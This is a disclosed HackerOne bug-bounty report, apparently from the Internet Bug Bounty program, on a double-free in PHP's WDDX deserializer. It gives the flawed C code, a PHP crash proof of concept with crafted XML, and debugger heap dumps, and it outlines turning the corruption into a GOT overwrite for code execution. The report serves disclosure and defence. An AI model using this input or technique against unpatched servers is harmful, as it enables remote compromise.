{
  "id": 146255,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDYyNTU=",
  "url": "https://hackerone.com/reports/146255",
  "title": "Double Free Corruption in wddx.c (extension)",
  "state": "Closed",
  "substate": "resolved",
  "readable_substate": "Resolved",
  "created_at": "2016-06-21T15:52:28.912Z",
  "submitted_at": "2016-06-21T15:52:28.912Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "hoangnguyen",
    "url": "/hoangnguyen",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/074/688/42c5ca5265ff965283d70fc52df2681dfd648d44_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQY5SNTJY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T121525Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCop3Q63LW7Yv49h39we4XGKTgB9I7F6pJKpNEAG5240gIhAKwETGKrJzPr%2F7fM%2BGdJgnL4ieElyx642F%2B3bdwtyvMVKrIFCHAQAxoMMDEzNjE5Mjc0ODQ5IgxiJGR4b42ipezn2VQqjwWrA2dov7Kt2r6FlNqmUOd9MA4HZlBgL1aIs2MOL60HKsdB5AZvyhHiEBPXVQr4PRTgTp8Fi9ZMOPf3CAhXGbJjM9jp592k%2F7TreupWqubvRT868TwIa44%2BRxJqPSZCl254kSE6JQrHSLo4RI9TDYlrpANeUojlGlKylV9eTlYBndbRNzlqIOcwxONXEsxR818hC8%2BGtnVFIgATvsbSUH%2BiA0x7Lb32jiQVuy0oeZBUN5jX9t7XP7Jk7ecQsNQPi9QCNGheWGZgWQ8ddzaHm4csId42PSTSRLaQP5ntNNmd%2FZS5od6u37mLHNfS9V4v9e4pxXeT5WZtttJzE9Yys%2B8fmie4dZbg%2Bv2v%2Fp9p8KxHKm1rF7WKTRhCxwktkUkOyx9MAzKZeWr8PwnbUFm1cwRFNbUP8uLqBodTvabXBErW6EX1Kk50mcS1S2FwIz0UDayFMkzQ9KzbaWRrp3FrqWXtp5Z5yNZL%2BTlIv0TZiulPPU%2FaB6Q7FMNaN921cTtaFEpww368Ewb0eSXe76I3OkpT%2FGX%2FHtCYgzigJ7e5Vfb5IJgxhYd41G%2F0hpmJ%2FQ6wQyMFULMjyfrt8087O6e4BNzCrtGdfGH9m6KVsCGCh3lGYnc8VpsjPZjdftmAxBw9yds%2BVPnA62EUqSGd%2FoMQiStjwsf1c29bJFnctk2xMx4DUMKIWZoJ23jxOXwehPc7n14JsfnnVVG7RszDWeOdW624nWGdzWza36%2FDlclzHITfSbJTysPSrpPNaFgc0AnmZlVyb2thOsjfVj2wNKEOJa%2FAOjbcdoHiPxxPnQ0r1cfza05F92Aej%2FcNcVmqgKZwhrm7HX%2BYc1IKfOOz7M4P7Bhh7Ia6AcN95bPhcWLTZrmOMOGnrK4GOrABPXk11jqiK7cEnzOjvWGuSWl85sW7hizljGLFnEQMe4PXo5MCLGc8x7feomShfmj0rx927DYI79pdEmRhxSFaO9lFyhtZETXKtv3%2FvyXRabiLAGZzzkBQDRZUn%2Fr%2Fic3VGYzVuS6LhjMPI3o9Jo49wbqCEKynJJ5On5e3b2almIO4JNp3PvEktFAODdzTkgUrByaeTnasF6%2B80vs8pNG22RpLdF0sqmofolZbs%2F8BX30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9389932fe1668f53f5e24f1e69bba7474839b9e92f79d3f53287711288085762",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQY5SNTJY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T121525Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCop3Q63LW7Yv49h39we4XGKTgB9I7F6pJKpNEAG5240gIhAKwETGKrJzPr%2F7fM%2BGdJgnL4ieElyx642F%2B3bdwtyvMVKrIFCHAQAxoMMDEzNjE5Mjc0ODQ5IgxiJGR4b42ipezn2VQqjwWrA2dov7Kt2r6FlNqmUOd9MA4HZlBgL1aIs2MOL60HKsdB5AZvyhHiEBPXVQr4PRTgTp8Fi9ZMOPf3CAhXGbJjM9jp592k%2F7TreupWqubvRT868TwIa44%2BRxJqPSZCl254kSE6JQrHSLo4RI9TDYlrpANeUojlGlKylV9eTlYBndbRNzlqIOcwxONXEsxR818hC8%2BGtnVFIgATvsbSUH%2BiA0x7Lb32jiQVuy0oeZBUN5jX9t7XP7Jk7ecQsNQPi9QCNGheWGZgWQ8ddzaHm4csId42PSTSRLaQP5ntNNmd%2FZS5od6u37mLHNfS9V4v9e4pxXeT5WZtttJzE9Yys%2B8fmie4dZbg%2Bv2v%2Fp9p8KxHKm1rF7WKTRhCxwktkUkOyx9MAzKZeWr8PwnbUFm1cwRFNbUP8uLqBodTvabXBErW6EX1Kk50mcS1S2FwIz0UDayFMkzQ9KzbaWRrp3FrqWXtp5Z5yNZL%2BTlIv0TZiulPPU%2FaB6Q7FMNaN921cTtaFEpww368Ewb0eSXe76I3OkpT%2FGX%2FHtCYgzigJ7e5Vfb5IJgxhYd41G%2F0hpmJ%2FQ6wQyMFULMjyfrt8087O6e4BNzCrtGdfGH9m6KVsCGCh3lGYnc8VpsjPZjdftmAxBw9yds%2BVPnA62EUqSGd%2FoMQiStjwsf1c29bJFnctk2xMx4DUMKIWZoJ23jxOXwehPc7n14JsfnnVVG7RszDWeOdW624nWGdzWza36%2FDlclzHITfSbJTysPSrpPNaFgc0AnmZlVyb2thOsjfVj2wNKEOJa%2FAOjbcdoHiPxxPnQ0r1cfza05F92Aej%2FcNcVmqgKZwhrm7HX%2BYc1IKfOOz7M4P7Bhh7Ia6AcN95bPhcWLTZrmOMOGnrK4GOrABPXk11jqiK7cEnzOjvWGuSWl85sW7hizljGLFnEQMe4PXo5MCLGc8x7feomShfmj0rx927DYI79pdEmRhxSFaO9lFyhtZETXKtv3%2FvyXRabiLAGZzzkBQDRZUn%2Fr%2Fic3VGYzVuS6LhjMPI3o9Jo49wbqCEKynJJ5On5e3b2almIO4JNp3PvEktFAODdzTkgUrByaeTnasF6%2B80vs8pNG22RpLdF0sqmofolZbs%2F8BX30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b67ddecb9778eeb5abd983eac8d0d8804ed7a40da06560666a82f22b02664b2f"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-11-12T09:35:00.257Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-10-13T09:34:59.406Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "There are a bug double free occur in wddx_deserialize, which trying to deserialize malicious xml input from user's request.\n\nThe problem start here in :\n```\nstatic void php_wddx_push_element(void *user_data, const XML_Char *name, const XML_Char **atts)\n{\n           ...snip.....\n\t} else if (!strcmp((char *)name, EL_BOOLEAN)) {\n\t\tint i;\n\n\t\tif (atts) for (i = 0; atts[i]; i++) {\n\t\t\tif (!strcmp((char *)atts[i], EL_VALUE) && atts[++i] && atts[i][0]) {\n\t\t\t\tent.type = ST_BOOLEAN;\n\t\t\t\tSET_STACK_VARNAME;\n\n\t\t\t\tZVAL_TRUE(&ent.data);\n\t\t\t\twddx_stack_push((wddx_stack *)stack, &ent, sizeof(st_entry));\n\t\t\t\tphp_wddx_process_data(user_data, atts[i], strlen((char *)atts[i]));\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n}\n```\nWhen wddx_deserialize a tag <boolean value=\"true/false\"> they get content of value and then pass to  php_wddx_process_data(user_data, atts[i], strlen((char *)atts[i])); directly.\n\n```\nstatic void php_wddx_process_data(void *user_data, const XML_Char *s, int len)\n{\n           ...snip.....\n          wddx_stack_top(stack, (void**)&ent); //return element in top of the stack\n           switch (ent->type) {\n\t\t\tcase ST_BOOLEAN:\n\t\t\t\tif (!strcmp((char *)s, \"true\")) {\n\t\t\t\t\tZ_LVAL(ent->data) = 1;\n\t\t\t\t} else if (!strcmp((char *)s, \"false\")) {\n\t\t\t\t\tZ_LVAL(ent->data) = 0;\n\t\t\t\t} else {\n\t\t\t\t\tzval_ptr_dtor(&ent->data);\n\t\t\t\t\tif (ent->varname) {\n\t\t\t\t\t\tefree(ent->varname);\n\t\t\t\t\t}\n\t\t\t\t\tZVAL_UNDEF(&ent->data);\n\t\t\t\t}\n\t\t\t\tbreak;\n        ...snip....\n}\n```\nIn php_wddx_process_data they just compare value data with \"true\" or \"false\" and set 0/1 to ent->data. The  problem is if value is not true/false then they call **efree(ent->varname) ** .\nAfter that, php_wddx_process_data back to php_wddx_push_element to continute execution. If i add some string in <boolean> (ex: <boolean value=\"none\">AAAAA</boolean> ), php_wddx_process_data will call again (after php_wddx_push_element had ended) and wddx_stack_top will return the same ent in the last called  php_wddx_process_data and because s in this second call point to own xml string and ent->type still is boolean so efree(ent->varname) will hit again, and this leads to double free.\n\n### Crash Poc (Ubuntu 16.04 x86_64,PHP 7.0.4 (cli))\ntest.php\n```\n<?php\n$xml = <<<EOF\n<?xml version='1.0' ?>\n<!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'>\n<wddxPacket version='1.0'>\n\t<array>\n\t\t<var name=\"XXXXXXXX\">\n\t\t\t<boolean value=\"none\">AAAAAAA</boolean>\n\t\t</var>\n\t\t<var name=\"YYYYYYYY\">\n\t\t\t<var name=\"ZZZZZZZZ\">\n\t\t\t\t<var name=\"EZEZEZEZ\">\n\t\t\t\t</var>\n\t\t\t</var>\n\t\t</var>\n\t</array>\n</wddxPacket>\nEOF;\n$array = wddx_deserialize($xml);\n\n// echo var_dump($array);\n\nforeach($array as $key => $value){\n\techo \"{$key} : {$value}\\n\";\n}\n// php\n?>\n```\n\nAnd we got :\n```\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nRAX: 0x5959595959595959 ('YYYYYYYY')\nRBX: 0x5\nRCX: 0x14\nRDX: 0x9 ('\\t')\nRSI: 0x30 ('0')\nRDI: 0x7ffff4400040 --> 0x0\nRBP: 0x7fffffffab20 --> 0x7fffffffab90 --> 0x7fffffffabc0 --> 0x7fffffffac00 --> 0x7fffffffad20 --> 0x7fffffffada0 --> 0x121b780 --> 0x1217fe0 --> 0x0\nRSP: 0x7fffffffaad0 --> 0x7ffff4471100 --> 0x9 ('\\t')\nRIP: 0x8536b1 (<zend_mm_alloc_small+176>:\tmov    rdx,QWORD PTR [rax])\nR8 : 0x313\nR9 : 0x0\nR10: 0x5\nR11: 0x1\nR12: 0x121cd34 --> 0x6f6f6200656d616e ('name')\nR13: 0x121985b (\"name=\\\"UUUUUUUU\\\">\\n\\t\\t\\t\\t</var>\\n\\t\\t\\t</var>\\n\\t\\t</var>\\n\\t</array>\\n</wddxPacket>\")\nR14: 0x1\nR15: 0x121d150 --> 0x121cd34 --> 0x6f6f6200656d616e ('name')\nEFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x8536a5 <zend_mm_alloc_small+164>:\tmov    rax,QWORD PTR [rax+rdx*8]\n   0x8536a9 <zend_mm_alloc_small+168>:\tmov    QWORD PTR [rbp-0x8],rax\n   0x8536ad <zend_mm_alloc_small+172>:\tmov    rax,QWORD PTR [rbp-0x8]\n=> 0x8536b1 <zend_mm_alloc_small+176>:\tmov    rdx,QWORD PTR [rax]\n   0x8536b4 <zend_mm_alloc_small+179>:\tmov    rax,QWORD PTR [rbp-0x28]\n   0x8536b8 <zend_mm_alloc_small+183>:\tmov    ecx,DWORD PTR [rbp-0x34]\n   0x8536bb <zend_mm_alloc_small+186>:\tmovsxd rcx,ecx\n   0x8536be <zend_mm_alloc_small+189>:\tadd    rcx,0x4\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffaad0 --> 0x7ffff4471100 --> 0x9 ('\\t')\n0008| 0x7fffffffaad8 --> 0x0\n0016| 0x7fffffffaae0 --> 0xd91858 (\"/home/vagrant/Sources_Ext/php7.0-7.0.4/ext/wddx/wddx.c\")\n0024| 0x7fffffffaae8 --> 0x500000313\n0032| 0x7fffffffaaf0 --> 0x30 ('0')\n0040| 0x7fffffffaaf8 --> 0x7ffff4400040 --> 0x0\n0048| 0x7fffffffab00 --> 0x7ffff44710f0 (\"ZZZZZZZZ\")\n0056| 0x7fffffffab08 --> 0x59688\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x00000000008536b1 in zend_mm_alloc_small (heap=0x7ffff4400040, size=0x30, bin_num=0x5,\n    __zend_filename=0xd91858 \"/home/vagrant/Sources_Ext/php7.0-7.0.4/ext/wddx/wddx.c\",\n    __zend_lineno=0x313, __zend_orig_filename=0x0, __zend_orig_lineno=0x0)\n    at /home/vagrant/Sources_Ext/php7.0-7.0.4/Zend/zend_alloc.c:1291\n1291\t\t\theap->free_slot[bin_num] = p->next_free_slot;\n```\n### Analysis in deep \n\nWhen free(XXXXXXXX)  zend_mm_alloc_small will update linked list for each size request and store the last freed chunk into heap->free_slot. Because free(XXXXXXXX) was freed 2 times then this next pointer will point to itself.\n\nAfter 1st efree(ent->varname).\n```\n[-------------------------------------code-------------------------------------]\n   0x7c6f0b <php_wddx_process_data+606>:\n    lea    rsi,[rip+0x5ca946]        # 0xd91858\n   0x7c6f12 <php_wddx_process_data+613>:  mov    rdi,rax\n   0x7c6f15 <php_wddx_process_data+616>:  call   0x85637d <_efree>\n=> 0x7c6f1a <php_wddx_process_data+621>:  mov    rax,QWORD PTR [rbp-0x60]\n   0x7c6f1e <php_wddx_process_data+625>:  mov    DWORD PTR [rax+0x8],0x0\n   0x7c6f25 <php_wddx_process_data+632>:\n    jmp    0x7c7005 <php_wddx_process_data+856>\n   0x7c6f2a <php_wddx_process_data+637>:  mov    eax,DWORD PTR [rbp-0x74]\n   0x7c6f2d <php_wddx_process_data+640>:  add    eax,0x1\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffab80 --> 0x7ffff4402a40 --> 0x121d150 --> 0x121cd41 --> 0x65756c6176 ('value')\n0008| 0x7fffffffab88 --> 0x4f4402a60\n0016| 0x7fffffffab90 --> 0x12046b0 --> 0x74696873 ('shit')\n0024| 0x7fffffffab98 --> 0x7fffffffb060 --> 0x1000000002\n0032| 0x7fffffffaba0 --> 0x7ffff4402a40 --> 0x121d150 --> 0x121cd41 --> 0x65756c6176 ('value')\n0040| 0x7fffffffaba8 --> 0x7fffffffb060 --> 0x1000000002\n0048| 0x7fffffffabb0 --> 0xd91858 (\"/home/vagrant/Sources_Ext/php7.0-7.0.4/ext/wddx/wddx.c\")\n0056| 0x7fffffffabb8 --> 0x20 (' ')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n1023            ZVAL_UNDEF(&ent->data);\ngdb-peda$ x/gx 0x7ffff44710c0\n0x7ffff44710c0: 0x00007ffff4471090\n```\n\nAfter the second efree(ent->varname)\n\n```\n[-------------------------------------code-------------------------------------]\n   0x7c6f0b <php_wddx_process_data+606>:\n    lea    rsi,[rip+0x5ca946]        # 0xd91858\n   0x7c6f12 <php_wddx_process_data+613>:  mov    rdi,rax\n   0x7c6f15 <php_wddx_process_data+616>:  call   0x85637d <_efree>\n=> 0x7c6f1a <php_wddx_process_data+621>:  mov    rax,QWORD PTR [rbp-0x60]\n   0x7c6f1e <php_wddx_process_data+625>:  mov    DWORD PTR [rax+0x8],0x0\n   0x7c6f25 <php_wddx_process_data+632>:\n    jmp    0x7c7005 <php_wddx_process_data+856>\n   0x7c6f2a <php_wddx_process_data+637>:  mov    eax,DWORD PTR [rbp-0x74]\n   0x7c6f2d <php_wddx_process_data+640>:  add    eax,0x1\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffad00 --> 0x7\n0008| 0x7fffffffad08 --> 0x400000005\n0016| 0x7fffffffad10 --> 0x1219809 (\"\\n\\t\\t\\t</boolean>\\n\\t\\t</var>\\n\\t\\t<var name=\\\"YYYYYYYY\\\">\\n\\t\\t\\t<var name=\\\"ZZZZZZZZ\\\">\\n\\t\\t\\t\\t<var name=\\\"EZEZEZEZ\\\">\\n\\t\\t\\t\\t</var>\\n\\t\\t\\t</var>\\n\\t\\t</var>\\n\\t</array>\\n</wddxPacket>\")\n0024| 0x7fffffffad18 --> 0x7fffffffb060 --> 0x1000000002\n0032| 0x7fffffffad20 --> 0x7ffff4402a40 --> 0x121d150 --> 0x121cd41 --> 0x65756c6176 ('value')\n0040| 0x7fffffffad28 --> 0x7fffffffb060 --> 0x1000000002\n0048| 0x7fffffffad30 --> 0x121d168 --> 0x0\n0056| 0x7fffffffad38 --> 0x121cd41 --> 0x65756c6176 ('value')\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n1023            ZVAL_UNDEF(&ent->data);\ngdb-peda$ x/gx 0x7ffff44710c0\n0x7ffff44710c0: 0x00007ffff44710c0\n```\nwe got a chunk that point to itself, because zend_mm_alloc_small() will update heap->free_slot[bin_num] = p->next_free_slot.\n\nIf we try to malloc with the same size of ent->varname (was freed) at 0x7ffff44710c0 :\n\n1st malloc : YYYYYYYY , zend_mm_alloc_small() will return with 0x7ffff44710c0 and update heap->free_slot[bin_num] = p->next_free_slot = 0x7ffff44710c0 (because 0x7ffff44710c0 point to itself as above).\n\n```\n[----------------------------------registers-----------------------------------]\nRAX: 0x7ffff44710c0 (\"YYYYYYYY\")\nRBX: 0x5\nRCX: 0x12\nRDX: 0x9 ('\\t')\nRSI: 0x12046b0 (\"YYYYYYYY\")\nRDI: 0x7ffff44710c0 (\"YYYYYYYY\")\nRBP: 0x7fffffffad20 --> 0x7fffffffada0 --> 0x121b780 --> 0x1217fe0 --> 0x0\nRSP: 0x7fffffffac10 --> 0x7ffff4402a40 --> 0x7ffff44029c0 --> 0x7ffff4402980 --> 0x7ffff4402940 --> 0x7ffff44028c0 --> 0x7ffff4402bc0 --> 0x7ffff4402c00 --> 0x7ffff4402c40 --> 0x7ffff4402c80 --> 0x7ffff4402cc0 --> 0x7ffff4402d00 --> 0x7ffff4402d40 --> 0x7ffff4402d80 --> 0x7ffff4402dc0 --> 0x7ffff4402e00 --> 0x7ffff4402e40 --> 0x7ffff4402e80 --> 0x7ffff4402ec0 --> 0x7ffff4402f00 --> 0x7ffff4402f40 --> 0x7ffff4402f80 --> 0x7ffff4402fc0 --> 0x0\nRIP: 0x7c5ce1 (<php_wddx_push_element+2802>:  mov    rdx,rax)\nR8 : 0x313\nR9 : 0x0\nR10: 0x5\nR11: 0x1\nR12: 0x121cd34 --> 0x6f6f6200656d616e ('name')\nR13: 0x1219828 (\"name=\\\"YYYYYYYY\\\">\\n\\t\\t\\t<var name=\\\"ZZZZZZZZ\\\">\\n\\t\\t\\t\\t<var name=\\\"EZEZEZEZ\\\">\\n\\t\\t\\t\\t</var>\\n\\t\\t\\t</var>\\n\\t\\t</var>\\n\\t</array>\\n</wddxPacket>\")\nR14: 0x1\nR15: 0x121d150 --> 0x121cd34 --> 0x6f6f6200656d616e ('name')\nEFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x7c5cd2 <php_wddx_push_element+2787>:\n    lea    rsi,[rip+0x5cbb7f]        # 0xd91858\n   0x7c5cd9 <php_wddx_push_element+2794>: mov    rdi,rax\n   0x7c5cdc <php_wddx_push_element+2797>: call   0x856850 <_estrdup>\n=> 0x7c5ce1 <php_wddx_push_element+2802>: mov    rdx,rax\n   0x7c5ce4 <php_wddx_push_element+2805>: mov    rax,QWORD PTR [rbp-0xc0]\n   0x7c5ceb <php_wddx_push_element+2812>: mov    QWORD PTR [rax+0x8],rdx\n   0x7c5cef <php_wddx_push_element+2816>:\n    jmp    0x7c639c <php_wddx_push_element+4525>\n   0x7c5cf4 <php_wddx_push_element+2821>: add    DWORD PTR [rbp-0xd8],0x1\n[------------------------------------stack-------------------------------------]\n```\n\n2nd malloc : ZZZZZZZZ , zend_mm_alloc_small() will return with 0x7ffff44710c0 again and then update \nheap->free_slot[bin_num] = p->next_free_slot = YYYYYYYY (because zend_mm_alloc_small think YYYYYYYY is the next_free_slot).\n\n3rd malloc:  EZEZEZEZ, zend_mm_alloc_small() will return YYYYYYYY for us and this lead to crash at **heap->free_slot[bin_num] = p->next_free_slot;** when zend_mm_alloc_small() try to update next_free_slot to heap->free_slot.\n\nAt this point, if we replace YYYYYYYY with an address of GOT table for example memcpy@got, zend_mm_alloc_small() will happly return this address for us, and the call memcpy(memcpy@got,EZEZEZEZE,8); in which EZEZEZEZ is value we control, this may lead to remote code execution.\n\nThis bug also works in PHP 7.0.x\n\nReferences: https://bugs.php.net/bug.php?id=72340",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-12T09:34:59.491Z",
  "allow_singular_disclosure_after": -134275226.4725235,
  "singular_disclosure_allowed": true,
  "vote_count": 1,
  "voters": [
    "dyabla"
  ],
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
